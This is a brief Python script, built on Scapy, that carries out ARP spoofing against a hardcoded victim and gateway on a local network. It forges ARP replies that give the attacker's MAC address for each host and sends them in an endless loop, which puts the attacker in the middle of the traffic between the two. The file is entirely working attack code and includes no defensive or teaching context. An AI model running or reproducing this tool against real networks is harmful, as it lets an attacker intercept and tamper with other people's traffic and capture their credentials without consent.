from scapy.layers.inet import ICMP, UDP, TCP
from whois import whois
import socket

from scapy.all import *
from random import randint

import time

def main():
    gatewayIP = "192.168.249.233"
    victimIP = "192.168.249.12"

    victimMAC = "00:0c:29:69:08:66"
    gatewayMAC = "fa:fb:17:1b:c4:7c"
    hackMAC = "00:0c:29:55:aa:74"

    #print(getmacbyip("192.168.249.12"))
    packet1 = Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC,hwdst=victimMAC,psrc=gatewayIP,pdst=victimIP,op=2)
    packet2 = Ether(src=hackMAC,dst=gatewayMAC)/ARP(hwsrc=hackMAC,hwdst=gatewayMAC,psrc=victimIP,pdst=gatewayIP,op=2)

    while 1:
        sendp(packet1,iface="eth0",verbose=False)
        sendp(packet2,iface="eth0",verbose=False)
        time.sleep(1)
        print(packet1.show())
        print(packet2.show())
        print("===============")


if __name__ == '__main__':
    main()